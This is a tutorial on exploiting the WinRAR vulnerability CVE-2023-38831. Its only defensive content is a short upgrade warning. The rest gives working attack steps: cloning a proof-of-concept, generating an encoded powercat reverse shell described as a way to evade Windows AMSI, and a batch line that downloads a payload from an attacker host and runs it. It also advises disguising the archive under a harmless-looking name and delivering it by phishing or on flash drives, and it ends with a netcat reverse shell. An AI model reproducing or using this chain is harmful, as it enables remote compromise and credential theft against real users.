# Being hacked through winrar (CVE-2023-38831)

If you are using WinRAR versions prior to 6.23, which is the case for many users, it has a vulnerability which hackers can potentially exploit to compromise your computer. They could gain remote access or, depending on your privilege level, install keyloggers to monitor and steal sensitive information, including your social media and internet banking passwords. To safeguard your system, it is crucial to take immediate action. Upgrade to WinRAR version 6.24 as soon as possible. In the following demonstration, I will illustrate how this attack can be executed and provide guidance on steps to protect yourself.

## STEPS
### 1. POC Script

Numerous proof-of-concept (POC) scripts are readily available. You can clone this specific one by using the following command:
```
┌──(kali㉿kali)-[/tmp/CVE-2023-38831]
└─$ git clone https://github.com/HDCE-inc/CVE-2023-38831.git
Cloning into 'CVE-2023-38831'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 2), reused 5 (delta 0), pack-reused 0
Receiving objects: 100% (17/17), 4.25 KiB | 4.25 MiB/s, done.
Resolving deltas: 100% (2/2), done.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/CVE-2023-38831]
└─$ 

```  

### 2. Beating Windows' Anti-malware Scan Interface
Due to Windows' Anti-malware Scan Interface (AMSI) that actively scans for the execution of potentially malicious PowerShell code, we must adopt a more sophisticated approach when crafting our reverse code. Traditional one-liners typically used in Capture The Flag (CTF) challenges may not succeed in this scenario. To circumvent AMSI, it is advisable to employ a tool like Powercat to generate an encrypted payload, which is more likely to deceive AMSI's detection mechanisms. Powercat is the implementation of netcat in powershell. Use the ``` -c ``` option to denote client and ``` -p ``` to designate a port. Use ``` -ge ``` to generate encoded payload. We will use powershell ``` -E ``` option to execute it. Finally we redirect the payload to a file ``` shell.txt ``` with linux ``` > ``` operator.

On your Kali box, run the command:
```
┌──(kali㉿kali)-[/tmp]
└─$ powercat -c 192.168.8.179 -p 8080 -e cmd.exe -ge > shell.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]

```
The above command means the reverse shell will connect back to my machine, IP ``` 192.168.8.179 ``` on port ``` 8080 ```. We can view the contents of the payload with cat. Here is a snippet.

```
└─$ cat shell.txt 
ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAA.....

```
### 3. Generating the malicious winrar file
Next you need to create a batch file that we will use to run the above code.

```
START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://192.168.8.179/shell.txt');iex 'powershell -E $code'

```

![Screenshot from 2023-10-19 12-40-16](https://github.com/xogutu/cve/assets/5442305/c2ac8ef9-4e28-4deb-a7bb-f9b0a9537a40)

Now use the downloaded POC code to create the malicious winrar file. Give the file a name that is not suspect like Financial_Year_2023.rar. You need to find a way to share this file with your target like a targeted phishing campaign or placing it in a public share or distributing it on flash drives e.t.c. In our case for the POC, simply transfer it to windows. 

![Screenshot from 2023-10-19 12-41-52](https://github.com/xogutu/cve/assets/5442305/ae398ca2-b200-4a47-9e7f-95bbc67cceb4)

Start a netcat listener on port 8080 from the Kali box.
![Screenshot from 2023-10-19 12-43-50](https://github.com/xogutu/cve/assets/5442305/396f36b3-b39c-4393-bff5-cc2f16843319)

Start a python web server to enable you download the file from your Kali box.
![Screenshot from 2023-10-19 12-44-31](https://github.com/xogutu/cve/assets/5442305/0c0521cb-b5c6-4d48-8ea0-4a3f4e11c3a1)

### 4. Exploiting the vulnerability
From windows machine, open the pdf with winrar.
![VirtualBox_Windows_18_10_2023_16_02_37](https://github.com/xogutu/cve/assets/5442305/53b1d657-2b61-423e-8b4e-dffff8cabfdd)

We can see that a download was done by our victim machine for shell.txt

![Screenshot from 2023-10-19 12-45-31](https://github.com/xogutu/cve/assets/5442305/c2125985-6fb0-49b2-84fd-e1555eea97ca)

### 5. Reverse Shell
Back to our Kali box, we see that we have a reverse shell.
![Screenshot from 2023-10-19 12-47-07](https://github.com/xogutu/cve/assets/5442305/5632b758-974f-43e8-addf-52871891cfa4)




